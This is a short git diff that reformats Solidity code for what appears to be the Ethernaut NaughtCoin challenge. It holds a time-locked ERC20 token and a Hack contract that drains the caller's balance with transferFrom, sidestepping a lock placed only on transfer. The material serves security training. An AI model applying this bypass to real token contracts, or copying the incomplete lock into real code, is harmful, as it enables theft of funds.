@@ -20,10 +20,7 @@ contract NaughtCoin is ERC20 {
         emit Transfer(address(0), player, INITIAL_SUPPLY);
     }
 
-    function transfer(
-        address _to,
-        uint256 _value
-    ) public override lockTokens returns (bool) {
+    function transfer(address _to, uint256 _value) public override lockTokens returns (bool) {
         super.transfer(_to, _value);
     }
 
@@ -46,10 +43,6 @@ contract Hack {
     }
 
     function hack() public {
-        target.transferFrom(
-            msg.sender,
-            address(this),
-            target.balanceOf(msg.sender)
-        );
+        target.transferFrom(msg.sender, address(this), target.balanceOf(msg.sender));
     }
 }
